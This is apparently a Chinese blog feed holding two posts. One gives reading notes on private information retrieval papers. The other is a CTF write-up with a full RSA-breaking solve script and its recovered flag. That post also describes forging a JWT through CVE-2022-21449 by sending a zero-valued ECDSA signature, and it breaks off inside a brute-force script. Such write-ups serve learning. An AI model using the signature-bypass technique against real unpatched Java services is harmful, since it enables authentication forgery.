\leftarrow ⊥&amp;\\            &amp;\qquad\quad i^{&#39;} \stackrel{R}{\longleftarrow}Eval(sk)&amp;\\            &amp;\qquad\quad sk_q \leftarrow Shift(sk,i-i^{&#39;})&amp;\\        &amp;\qquad if\;b=0:\qquad i_{punc} \leftarrow i&amp;\\        &amp;\qquad else: \qquad\quad\;\;\; i_{punc}\stackrel{R}{\longleftarrow} Eval(sk_q)\backslash \{i\}&amp;\\        &amp;\qquad output\;q \leftarrow Punc(sk_q, i_{punc}) &amp;\\\\    &amp;\quad Answer^x(q\in K_p )\rightarrow a\in\{0,1\}&amp;\\        &amp;\qquad S \leftarrow Eval(q)&amp;\\        &amp;\qquad return a \leftarrow \sum_{i\inS}x_i\;mod\;2&amp;\\\\    &amp;\quad Reconstruct(h\in \{0,1\}^m,a\in \{0,1\}) \rightarrow x_i&amp;\\        &amp;\qquad let\;j \;and\;b\;be\;as\;in\;Query&amp;\\        &amp;\qquad if\;j=⊥\;or\;b=0\;then\;output\;⊥ &amp;\\        &amp;\qquad output\;x_i\leftarrow h_j-a\;mod\;2 &amp;\\\end{align}\]</span></p><p>读paper的总结：</p><h1 id="private-information-retrievalwith-sublinear-online-time"><strong>PrivateInformation Retrievalwith Sublinear Online Time</strong></h1><p>第一篇，是Henry Corrigan-Gibbs和DmitryKogan二人写的，将PIR的过程拆成离线和在线阶段，并puncturable pseudorandomsets（后写为PRS）的概念引入其中，线性的计算放到离线阶段，使在线阶段的计算只有次线性的，而且没有引入额外的存储（其实我觉得是有的，毕竟client生成n<sup>(1/2)个同样大小的sets，还是生成了n的存储量，并且这些sets都要发给离线服务器算出hint，使得离线阶段的传输量是n；但是在在线阶段确实不需要更多的存储了，传输带宽也只是n</sup>(1/2)大小的)</p><p>总的来说，关键点是可穿刺的伪随机集，它能去掉某一点的信息，并且在客户端能恢复该点。原始的PRS有三个功能函数，(Genn(1^<em>λ</em><em>, n</em>), Punc(sk<em>, i</em>), Eval(sk<em>,i</em>))，通过输入安全参数λ和数据库大小n，Gen函数生成一个密钥，Punc函数进行穿刺，Eval函数密钥sk变成集合S；后面还加了两个功能函数GenWith(1^<em>λ</em><em>, n, i</em>)和Shift(sk<em>,δ</em>)，GenWith用于生成有指定元素的密钥，Shift就和它函数名一样，对密钥在有限域下进行一个加操作。</p><p>之后就是用前面所提出的PRS融入到PIR方案中，大致的流程如下：</p><ol type="1"><li>client在随机的概率分布下生成n<sup>(1/2)个大小为n</sup>(1/2)的集合S，全部发给离线计算服务器计算异或值返回给client</li><li>找一个存在x的集合S_i，对其进行穿刺（可以当作找到并丢弃x），然后发给在线服务器，返回去掉x的异或值</li><li>把1和2的结果进行异或，即可抵消其他的值，只留下x。由于两个服务器是不可进行交流的，因此可以两个服务器无法获取有关x的信息。</li><li>如果要进行多次取值，那就多了一个人refresh操作更新密钥，即将刚刚用过的S更新否则再次使用会被发现。具体方法是在2同时生成一个集合S‘，对其进行x的穿刺然后发给离线服务器，再得到S’的异或值，拿到后将这个异或值与x异或就可以得到S‘的hint</li></ol><p>后面还介绍了单服务器的情况，因为离线在线阶段在一个服务器上了，所以不能直接发集合过去，否则也会被发现。文中引入了全同态加密来描述，利用全同态方案对S进行加密再发给服务器，之后的步骤和上述差不多。</p><h1 id="efficient-transformation-capabilities-of-single-database-private-block-retrieval"><strong>EfficientTransformation Capabilities of Single Database Private BlockRetrieval</strong></h1><p>这一篇的思路和第一篇就很不一样了，没有采用离线/在线服务器的模式，也没有使用穿刺伪随机集，他基于一个NP问题即二次剩余构造单项陷门函数，和rabin系统类似，因此可以一次性获得一个block的数据（该文中把数据库当成u*v的矩阵数据，一次可以获得某一行的数据）。</p><p>在这篇里面学到了两个概念，<em>Information-theoreticPIR</em>和<em>Computationally bounded PIR</em>，第一篇虽然没有介绍但是也用到了，当时就没看懂。信息论的PIR指存在多个服务器，它们享有同一个数据库的copy但相互之间不进行沟通；计算有界的PIR是指基于某个密码假设的PIR方案。</p><p>这篇的实现就是利用加科比符号和二次剩余，具体就不展开了了，对我们要的研究方向不太一样。而且它的运算时间是线性的哈哈哈，还不如第一篇，我记得是复杂度u*v加一个log，那对于数据库大小来说就是线性的。不过他有一个优点是构造的方案可以在信息论PIR和计算有界PIR之间互相转换，这是其他方案难以做到的。</p><h1 id="puncturable-pseudorandom-sets-and-private-information-retrieval-with-near-optimal-online-bandwidth-and-time"><strong>PuncturablePseudorandom Sets and Private Information Retrieval with Near-OptimalOnline Bandwidth and Time</strong></h1><p>这一篇是在第一篇的基础上发展过来的，与第一篇相比，他的优点是在不增加计算时间的基础上减少了传输阶段所用的带宽：离线阶段仅传输n<sup>(1/2)大小的消息至left服务器，client收到一个n</sup>(1/2)大小的hint，在线阶段的带宽仅为O(1)，先前的O(n^(1/2))。但他采用了一种弱化PRS的方案，也即更通用的PRS，所以不像第一篇那样，这一篇存在不可忽略的概率导致结果出错，但总的来说正确率仍然保持的较高（单次2/3的正确率，并行运行128次），可是在第一篇中对x进行穿刺时仍然可能输出一个错误结果’⊥‘，所以我认为这个错误不是什么大问题。</p><p>既然达到了不同的效果，那么这一篇所用的Privately PuncturablePRFs肯定与前面的不同，更一般化的 Generalized Privately PuncturablePseudorandom Set如下：(Gen(1^<em>λ</em> <em>, n</em>), Set(sk),Member(sk, x), Puncture(msk, x))，多了一个member函数用于测试x是否在sk生成的集合中，同时Gen函数不仅会生成密钥sk，还会生成主密钥msk，这个也是降低传输带宽的关键点。</p><p>至于实现过程，其实和第一篇大同小异，仍然是利用集合的异或来恢复x，这里面多加了个超时机制（我是这么理解的），当超时时就会返回一个默认的异或值0，这也是出错的由来。至于refresh阶段也和第一篇类似。</p><h1 id="batched-differentially-private-information-retrieval"><strong>BatchedDifferentially Private Information Retrieval</strong></h1><p>这一篇也没有用穿刺伪随机集，他保留了离线在线分离的计算，自己设计了一个新的方法：differentiallyprivate-PIR(DPPIR)。最终的效果是把两次的运算时间变成了O(n^(1/2)+constant*n)，传输带宽是O(1)，带宽都降了不少但运算时间就变成了线性的。</p><p>看后面似乎运行条件也比较苛刻，需要同时多个用户查询，批处理查询才能实现这个效率，对主线帮助不大就不细看了。</p><h1 id="private-blocklist-lookups-with-checklist"><strong>PrivateBlocklist Lookups with Checklist</strong></h1><p> 这一篇又是CK20两人的paper，个人感觉不是纯理论上的，而是偏应用层面了。大概就是运用PIR方案实现对服务器端的字符串匹配，判断client处的字符串是否在服务器中，并且不泄露字符串的信息，优点还有不需要存储整个blocklist（类似于第二篇，将服务器端的数据库看作是一个矩阵，每次匹配的是某一行的字符）。还能使得服务端的计算是次线性的，最关键的是——它在blocklist经常更新的时候也满足，与我们的需求类似，值得好好研读；除此之外还有一些在运算速度上的提升等等。</p><p>PRS的构造和第一篇的类似，是(Gen, GenWith<em>,</em> Eval<em>,</em>Punc)，实现过程和第一篇有很大不同了。</p><p>大致的流程还是和第一篇类似，不过是从伯努利概型中根据(2(n^(1/2)-1)/n)的概率中生成β，在生成query查询时搞了两个方案，每个方案都有两套puncturedpseudorandom secretkey，根据β的值选择某一方案生成查询q，发给right后和第一篇是一样的，返回的answera也均可以完成对D_i的重构。</p><p>至于为什么能满足数据可更新，我目前粗浅的理解只是把数据不断分为更小的块，每次更新都使得较大的那一块保持不变而只有小块改变，因此left服务器对hint的更新不至于是O(n^(1/2))以上的。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;strong&gt;Private Information Retrieval&lt;/strong&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="Crypto" scheme="http://sh1k4ku.github.io/categories/Crypto/"/>
    
    
    <category term="PIR" scheme="http://sh1k4ku.github.io/tags/PIR/"/>
    
  </entry>
  
  <entry>
    <title>强网杯</title>
    <link href="http://sh1k4ku.github.io/2022/08/01/2022/%E5%BC%BA%E7%BD%91%E6%9D%AF/"/>
    <id>http://sh1k4ku.github.io/2022/08/01/2022/%E5%BC%BA%E7%BD%91%E6%9D%AF/</id>
    <published>2022-07-31T16:00:00.000Z</published>
    <updated>2022-08-03T05:31:57.818Z</updated>
    
    <content type="html"><![CDATA[<p>做了四道，获得了18名</p><span id="more"></span><h1 id="lattice-cry">Lattice $ cry</h1><p>paper链接：https://eprint.iacr.org/2020/461.pdf，里面贴了代码但是感觉没啥用</p><p>两题都可规化到这个Hidden Subset SumProblem下，第一题比较直接，矩阵<strong>A</strong>*B =<strong>C</strong>modn，要恢复B格基规约后的第一个行向量，其中A的元素很大而B的很小。paper里的思路是先用C构造出一个格，对这个格做BKZ算法得到它的正交基，再算一次正交基即可得到原矩阵的共轭矩阵。第二部再利用共轭矩阵恢复最短向量和x_i，可惜自己能力不足细节不能好好把握，之后有空再复盘8.</p><h1 id="factor">Factor</h1><p>paper链接：https://eprint.iacr.org/2015/399.pdf</p><p>因为和d3的一样所以直接就找到了，可惜还是慢一步出的，又错失血</p><p>gen123对应paper里的543，不过因为b给了所以只用打一元copper了，慢慢往回推得到flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">n11=<span class="number">801049932940568005269978912396585741498810389425615966036828877784238116634177290247194019425111606811005728521368879065336038221361037062407029836155148874719789714345603547779284558101833801155509762818376470874215789574939002212274399950433269775325144015468620263028557804618774240232988157961712628677901130814703917513004114547234375629747176834581166306552311075522669403347828095831520693563291249869832390698646691647204371133362254846234990175138047928703289833460734235302093916147489509206061923877623300596194317059884824322527532662470348274079800781120104946546063500763852622187404608639542858285661288293918912184354236687975919510300221932074135531028314170475917110204254042336116619335841213418990605590620842511615815443114612333881430920769002933370887494558640833005339906706603497809846863863967391543647049224309556936909768179259581851520214669904560467640473144481633920438487615788689262961741053146610554997224861331949716721056553499531186695425439163222802917813140266513735841447717418846360096652592844940362932171019143434080184728093326143821165097895058935372215708948088248596585127475770021962501262915274497478428868130455122612016408381607561200802267038869516896665387576895570245272035575637</span></span><br><span class="line">n12=<span class="number">635401970340205725139325006504978344512744926958688031423448003992072769931808217486709574151492230879374574313457662436423263437792389711379687512056391117410807565492548718691166183372633151644917135272259770997096195518489056319350258673723095417922153182423913759272893696867426193704479752772511081457729513843682588951499551132432923147997238597538055902932123792252593514225328196541483451747314048080824405530742533473914329294346486691684904100406972073037050089861816604505650042953778360621934380815999541183067585498606053857125775979915077329566722531830089714823979965934190338538564188253271016367299890015449611141166780048763403252309160517164569110740561584100839212138661881615351382946813818078899882595313362934594951895560189003438775450675343590147821186953526262224973333962454561275321925151619178204499342339749637758100126893330994252902926509705617882239610380420830791088907378397226817514095468815228186716220057075095711894070032344613244803934541318573847029365563159918970404057137270884587905766828750387753130065274147902379993224780149663600462492281891320702134153853359393588902750423972068679293373333869389393970353760507436913233657422185531482023237384247535554666481760197851108297145147371</span></span><br><span class="line">e11=<span class="number">1898839980562048754607069073527844852132536432440793106124181406514770178066775988232362054809850074774981836898118651469424148725970708199461113088705044905633592578936333918328544505910996746428679299419879472444790941363558025887620570856598548320246426354974395765243741646121743413447132297230365355148066914830856904433750379114692122900723772114991199979638987571559860550883470977246459523068862898859694461427148626628283198896659337135438506574799585378178678790308410266713256003479022699264568844505977513537013529212961573269494683740987283682608189406719573301573662696753903050991812884192192569737274321828986847640839813424701894578472933385727757445011291134961124822612239865</span></span><br><span class="line">e12=<span class="number">1262647419018930022617189608995712260095623047273893811529510754596636390255564988827821761126917976430978175522450277907063247981106405519094560616378241247111698915199999363948015703788616554657275147338766805289909261129165025156078136718573006479030827585347458143645738353716189131209398056741864848486818076440355778886993462012533397208330925057305502653219173629466948635110352752162442552541812665607516753186595817376029707777599029040724727499952161261179707271814405907165207904499722122779096230563548011491932378429654764486855147873135769116637484240454596231092684424572258119768093562747249251518965380465994055049411715353547147466711949391814550591591830515262296556050946881</span></span><br><span class="line"></span><br><span class="line">n2=<span class="number">209798341155088334158217087474227805455138848036904381404809759100627849272231840321985747935471287990313456209656625928356468120896887536235496490078123448217785939608443507649096688546074968476040552137270080120417769906047001451239544719039212180059396791491281787790213953488743488306241516010351179070869410418232801398578982244984544906579574766534671056023774009163991804748763929626213884208260660722705479782932001102089367261720194650874553305179520889083170973755913964440175393646890791491057655226024046525748177999422035469428780228224800114202385209306803288475439775037067014297973202621118959024226798935588827359265962780792266516120013602384766460619793738405476219362508944225007365127768741191310079985425349292613888185378948854602285379329682053663283534930182589905986063348509703027498270111412063194971956202729807710253369312175636837558252924035002153389909587349043986253518050303628071319876207392440085675892353421232158925122721273720564784886530611286461575045181073744696415657043278123662980166364494583141297996445429477446442693717498789391918530672770193730629928408766563592081857706608049076318165712479742423149330311238462044666384622153280310696667586565906758451118241914402257039981388209</span></span><br><span class="line">e2=<span class="number">65537</span></span><br><span class="line"></span><br><span class="line">n3=<span class="number">539779851369541956878655738599584730199799866957191805784596190682932284216781781433367450841202917758999300635019369629627621029957135109806205877317954671312041249493462048283611940752235036153024920172209763260723728345918562258401803973624430150143563078517485996070862532682695228590709019451174548520135142052216785774589096706631010293690859363524584240662502290912412366366114571976050857239915691266377257797199583543940504695517331512813468837128344612227973709974625418257243011036826241599265375741977853552204640800449679679351666009764297016524814036295707311913711955324055690490892097177271718850857268982130811714517356073266905474635370690445031512184247179039751734276906533177939993769044135143389748416635981226449566039039202521305851567296884751935162651063209779647359922622084851547605090230221057349511482738300221222563908357379545905837110168948295030747460300104202323692732549831403834387939156877086852393515817984772384147449841124275061609701453997579569931391166586163299940486204581696722731952467570857217406030804590055255431828403195798003509083922294733709507134156466158642941338493323430671502043066148246348074878064089651235355282144209668143249348243220714471988019011613749340243917652821</span></span><br><span class="line">e3=<span class="number">8179300978753084587812861894047395225516049110376948812109811319430275614612773726672345893359691900281432484382670047044697374818043512731533402576374645405477207239801498428774783768163880078495448747421425078521981578408638790336528372019271073712013371141939808017049399434858687299480461753638164719404612128939787055797762174745092074547412183349192156638711750872083313795551439465507724807626674514935170104573715458782366469587138508845980490673890245713729782917089910271980557159592807350504157192913530007199510144004848020221181558472160543018733124225266127379373751910439604459368078652499029070936707349862139053913745186413782066470461478961703013591655136140060879250067379283913798867648758171004535775565306842444545755351202796833177560656564652632975685912935281581268141803696686952259539945588609591385807620108279333498170028167338690235117003515264281843953984997958878272347778561933726792473981855755454522886321669676790813189668084373153897754540290867346751033567500922477317530445967753955221454744946208555394588111484610700789566547507402309549957740815535069057837915204852490930168843605732632328017129154852857227895362549146737618906180651623216848500491438142456250653458053922622240299736136335179639180898730269690699965799644757774472147210271111150769048976871249731156387939260749192370361488285775377622944817570292095201906142567403539151179209316853493906909989301225903409448461436855145</span></span><br><span class="line"></span><br><span class="line">c11=<span class="number">18979511327426975645936984732782737165217332092805655747550406443960209507493506811471688957217003792679188427155591583024966608843371190136274378868083075515877811693937328204553788450031542610082653080302874606750443090466407543829279067099563572849101374714795279414177737277837595409805721290786607138569322435729584574023597293220443351227559400618351504654781318871214405850541820427562291662456382362148698864044961814456827646881685994720468255382299912036854657082505810206237294593538092338544641919051145900715456411365065867357857347860000894624247098719102875782712030938806816332901861114078070638796157513248160442185781635520426230183818695937457557248160135402734489627723104008584934936245208116232179751448263136309595931691285743580695792601141363221346329077184688857290503770641398917586422369221744736905117499140140651493031622040723274355292502182795605723573863581253354922291984335841915632076694172921289489383700174864888664946302588049384130628381766560976143458735712162489811693014419190718601945154153130272620025118408017441490090252674737105557818759190934585829634273698371996797545908125156282869589331913665938038870431655063063535672001112420959158339261862052308986374193671007982914711432579</span></span><br><span class="line">c12=<span class="number">336587005671304527566745948355290412636261748969581976214239578621816863343117433524033533838636941679300497270909696775021031004312477997130741361709262822736904340641138652359632950455651920464042448022467664596484055174270895170499076347333381222768518599018520948098943626229061996126260154604038101543546588917619576702866444998578555907070990331574722135141778182631559802154493815687284077524469331290249057291163803290619701104007028836609832847351748020354798788508790258935718399783002069490123663345156902440501507117289747695510266461539019431610123351176227443612317037899257774045751487135646052309277098939919088029284437221840182769808850184827681307611389353392683707516141736067793897378911235819049432542758429901945202632117089595899280390575706266239252841152490534353760118231918190110043319877744119083811214707593122757409240645257409097436061825613686773916466122693168971062418046703969144004779270391320645495586024342668002497155358623795942692477164489475917351003149045087283510728981096449890130735055015075557614253867698702479920619299919816768972581273507837309179450374634916567083251630203067065663910073926990517108921490442919372774170201239734064819301693527366233007925670043499415100789027665</span></span><br><span class="line">c2=<span class="number">18352572608055902550350386950073774530453857897248738030380007830701135570310622004368605208336922266513238134127496822199799761713782366178177809597137102612444147565578155260524747439899150012223027218489946124086276814899675563837669559795153349686434242738207425653079514376089070980797596457151965772460109519623572502109592612394316680202287712465721767341302234806130244551387296133051760893033194962691942040228545508895009195291106297581470066545991352668826197346830561010198417527057944507902143965634058848276017283478933675052993657822322866778994956205033704582047618324071045349072526540250707463112668579342537349567247810715604220690215313641329522674080146047291570752430231923566302463491877377617044768978997438596643458475128936850994934029476030136643053997549253792076260765459166618369864942681056864815996253315631930002738854235841120321870075261782250357506436825550088826469396508045912258303652912217151127280959435741419961721418428605515096160344688795655562889755165362006775317188009008288782691705879510655892181975003485714604340542378477388225736316682379616676770234557939471098919647053799313777248678455620231721202780830980063824003076308811540534492317719811588898727134190545533822501681653</span></span><br><span class="line">c3=<span class="number">113097822337683973761068913398570777162211043704088253732500045618770280334319497174908657828372816818344430304314992760410247741225285170975119344962728883084314382093407445567724674775086423808679124143380073906159023182353116556175251427048715466914368972746661938211846262612414049036821553068430149530397389927209475908905748728402722287875974303298260579839357610962198145974153609818939841880084892796820949226354126424023144300953584658958900737493704530725894948802258740332090822797815745616247879170037794873059391625680745994045522420168248552864215035136318711240256011217929372430302003068882829637056296413462078222453765071094277727760527662423010417144554652783429899139309180017349156600053882338180319473460877576898373222480215735280046214925463242092830060830764299787309912687294672319845054775281463150375545716818434962456139485501224661520991156961587158843064393883274763714930309353593180897123378717852182761518709151878662808890356934477932099818218743384674756674800089177733447066489275506387382342429495897972218764782517198727316942685748481956118012927027254979181519862451112593068440686462293151078537886822555211870303467014484443432209106264020502334805536091587252238173816637270028678636848763</span></span><br><span class="line"></span><br><span class="line">n3=<span class="number">539779851369541956878655738599584730199799866957191805784596190682932284216781781433367450841202917758999300635019369629627621029957135109806205877317954671312041249493462048283611940752235036153024920172209763260723728345918562258401803973624430150143563078517485996070862532682695228590709019451174548520135142052216785774589096706631010293690859363524584240662502290912412366366114571976050857239915691266377257797199583543940504695517331512813468837128344612227973709974625418257243011036826241599265375741977853552204640800449679679351666009764297016524814036295707311913711955324055690490892097177271718850857268982130811714517356073266905474635370690445031512184247179039751734276906533177939993769044135143389748416635981226449566039039202521305851567296884751935162651063209779647359922622084851547605090230221057349511482738300221222563908357379545905837110168948295030747460300104202323692732549831403834387939156877086852393515817984772384147449841124275061609701453997579569931391166586163299940486204581696722731952467570857217406030804590055255431828403195798003509083922294733709507134156466158642941338493323430671502043066148246348074878064089651235355282144209668143249348243220714471988019011613749340243917652821</span></span><br><span class="line">e3=<span class="number">8179300978753084587812861894047395225516049110376948812109811319430275614612773726672345893359691900281432484382670047044697374818043512731533402576374645405477207239801498428774783768163880078495448747421425078521981578408638790336528372019271073712013371141939808017049399434858687299480461753638164719404612128939787055797762174745092074547412183349192156638711750872083313795551439465507724807626674514935170104573715458782366469587138508845980490673890245713729782917089910271980557159592807350504157192913530007199510144004848020221181558472160543018733124225266127379373751910439604459368078652499029070936707349862139053913745186413782066470461478961703013591655136140060879250067379283913798867648758171004535775565306842444545755351202796833177560656564652632975685912935281581268141803696686952259539945588609591385807620108279333498170028167338690235117003515264281843953984997958878272347778561933726792473981855755454522886321669676790813189668084373153897754540290867346751033567500922477317530445967753955221454744946208555394588111484610700789566547507402309549957740815535069057837915204852490930168843605732632328017129154852857227895362549146737618906180651623216848500491438142456250653458053922622240299736136335179639180898730269690699965799644757774472147210271111150769048976871249731156387939260749192370361488285775377622944817570292095201906142567403539151179209316853493906909989301225903409448461436855145</span></span><br><span class="line">r = <span class="number">7</span></span><br><span class="line">idx = (r*(r-<span class="number">1</span>)) / ((r+<span class="number">1</span>)*(r+<span class="number">1</span>))</span><br><span class="line">delta = <span class="built_in">int</span>(<span class="built_in">pow</span>(mpz(n3), idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">continuedFra</span>(<span class="params">x, y</span>): </span><br><span class="line">    cF = []</span><br><span class="line">    <span class="keyword">while</span> y:</span><br><span class="line">        cF += [x // y]</span><br><span class="line">        x, y = y, x % y</span><br><span class="line">    <span class="keyword">return</span> cF</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Simplify</span>(<span class="params">ctnf</span>): </span><br><span class="line">    numerator = <span class="number">1</span></span><br><span class="line">    denominator = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> ctnf[::-<span class="number">1</span>]: </span><br><span class="line">        numerator, denominator = x * numerator + denominator, numerator </span><br><span class="line">    <span class="keyword">return</span> (numerator, denominator)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getit</span>(<span class="params">c</span>):</span><br><span class="line">    cf=[]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="built_in">len</span>(c)):</span><br><span class="line">        cf.append(Simplify(c[:i])) </span><br><span class="line">    <span class="keyword">return</span> cf </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">wienerAttack</span>(<span class="params">e, n</span>):</span><br><span class="line">    cf=continuedFra(e,n)</span><br><span class="line">    <span class="keyword">for</span> (q1,q2) <span class="keyword">in</span> getit(cf):</span><br><span class="line">        <span class="keyword">if</span> q1 == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> n11%q1==<span class="number">0</span> <span class="keyword">and</span> q1!=<span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> (q1,q2)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;没找到能覆盖的分子/分母&#x27;</span>)</span><br><span class="line"></span><br><span class="line">q11,q12=wienerAttack(n11,n12)</span><br><span class="line">p11 = <span class="built_in">int</span>(gmpy2.iroot(n11//q11, <span class="number">2</span>)[<span class="number">0</span>])</span><br><span class="line">p12 = <span class="built_in">int</span>(gmpy2.iroot(n12//q12, <span class="number">2</span>)[<span class="number">0</span>])</span><br><span class="line">phi11 = (p11^<span class="number">2</span>-p11) * (q11-<span class="number">1</span>)</span><br><span class="line">phi12 = (p12^<span class="number">2</span>-p12) * (q12-<span class="number">1</span>)</span><br><span class="line">d11 = inverse_mod(e11, phi11)</span><br><span class="line">d12 = inverse_mod(e12, phi12)</span><br><span class="line">m1 = <span class="built_in">pow</span>(c11, d11, n11)</span><br><span class="line">m2 = <span class="built_in">pow</span>(c12, d12, n12)</span><br><span class="line"><span class="built_in">print</span>(m1)</span><br><span class="line"><span class="built_in">print</span>(m2)</span><br><span class="line"></span><br><span class="line">m1 = <span class="built_in">int</span>(m1)</span><br><span class="line">m2 = <span class="built_in">int</span>(m2)</span><br><span class="line">PR1.&lt;x&gt; = PolynomialRing(Zmod(n2), <span class="string">&#x27;x&#x27;</span>)</span><br><span class="line">f = m1*m2*x - (m2 - m1)</span><br><span class="line">f = f.monic()</span><br><span class="line"></span><br><span class="line">x0 = f.small_roots(X=<span class="number">2</span>^<span class="number">700</span>,beta=<span class="number">0.75</span>,epsilon=<span class="number">0.05</span>)[<span class="number">0</span>]</span><br><span class="line">p2 = <span class="built_in">int</span>(gcd(m1*m2*x0 - (m2 - m1), n2))</span><br><span class="line">p2 = <span class="built_in">int</span>(iroot(<span class="built_in">int</span>(p2),<span class="number">6</span>)[<span class="number">0</span>])</span><br><span class="line">q2 = <span class="built_in">int</span>(n2 // p2^<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">phi2 = (p2^<span class="number">7</span> - p2^<span class="number">6</span>)*(q2-<span class="number">1</span>)</span><br><span class="line">d2 = inverse_mod(e2, phi2)</span><br><span class="line">b = <span class="built_in">pow</span>(c2, d2, n2)</span><br><span class="line">b</span><br><span class="line"></span><br><span class="line">b = <span class="built_in">int</span>(b)</span><br><span class="line">PR2.&lt;y&gt; = PolynomialRing(Zmod(n3), <span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">g = e3*y - b</span><br><span class="line">y0 = g.monic().small_roots(X=<span class="number">2</span>^<span class="number">700</span>,beta=<span class="number">0.75</span>,epsilon=<span class="number">0.05</span>)[<span class="number">0</span>]</span><br><span class="line">p3 = gcd(e3*y0 - b, n3)</span><br><span class="line">p3 = <span class="built_in">int</span>(iroot(<span class="built_in">int</span>(p3), <span class="number">6</span>)[<span class="number">0</span>])</span><br><span class="line">q3 = n3 // p3^<span class="number">7</span></span><br><span class="line">phi3 = (p3^<span class="number">7</span> - p3^<span class="number">6</span>) * (q3 - <span class="number">1</span>)</span><br><span class="line">d3 = inverse_mod(e3, phi3)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(c3, d3, n3)))</span><br><span class="line"><span class="comment">#b&#x27;qwb&#123;8633ce6d-fece-4cf1-8f0f-f27e5bf6d678&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h1 id="myjwt">myJWT</h1><p>cve-2022-21449，参考soreatu师傅的博客：</p><p>https://blog.soreatu.com/posts/analysis-of-cve-2022-21449-bypass-java-signature-check-by-two-zeros/</p><p>关键是让sig传(0,0)，查看代码后发现第一段不变，sig传0但是要考虑编码，b'A'就是0</p><p>nc连上去，获取token，所以第一段jwt不变，第二段jwt把admin的值改为true，第三段放A</p><p><img src="/images/%E5%BC%BA%E7%BD%91%E6%9D%AF/image-20220803133111714.png" alt="image-20220803133111714"></p><h1 id="polydiv">polydiv</h1><p>看代码看半天，nc一下就知道是怎么回事了，浪费了不少时间</p><p>先过hash截断</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dehash</span>(<span class="params">s, re</span>):</span><br><span class="line">    alphabet = string.ascii_letters+string.digits</span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> alphabet:</span><br><span class="line">        <span class="keyword">for</span> b <span class="keyword">in</span> alphabet:</span><br><span class="line">            <span class="keyword">for</span> c <span class="keyword">in</span> alphabet:</span><br><span class="line">                <span class="keyword">for</span> d <span class="keyword">in</span> alphabet:</span><br><span class="line">                    ss=s+a+b+c+d</span><br><span class="line">                    <span class="keyword">if</span>  <span class="built_in">bin</span>(<span class="built_in">int</span>(sha256(ss.encode()).hexdigest(),<span class="number">16</span>)).endswith(re):</span><br><span class="line">                        <span class="keyword">return</span> a+b+c+d</span><br><span 